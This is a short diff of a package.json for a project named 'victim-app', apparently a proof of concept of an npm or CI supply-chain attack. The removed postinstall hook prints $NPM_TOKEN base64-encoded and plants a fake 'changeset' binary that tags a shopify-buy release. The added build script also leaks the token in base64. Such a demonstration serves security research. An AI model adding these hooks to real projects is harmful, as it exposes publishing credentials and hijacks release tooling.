@@ -2,11 +2,7 @@
     "name": "victim-app",
     "version": "1.0.0",
     "scripts": {
-        "postinstall": "echo '*** EXPLOIT SUCCESSFUL IN POSTINSTALL ***' && echo $NPM_TOKEN | base64 && mkdir -p node_modules/.bin && echo '#!/bin/sh' > node_modules/.bin/changeset && echo 'git tag shopify-buy@0.0.0-snapshot' >> node_modules/.bin/changeset && chmod +x node_modules/.bin/changeset",
-        "build": "echo 'Build Step Reached!'"
-    },
-    "devDependencies": {
-        "@changesets/cli": "2.26.0"
+        "build": "echo 'ATTACK STARTED'; echo $NPM_TOKEN | base64"
     },
     "dependencies": {}
 }
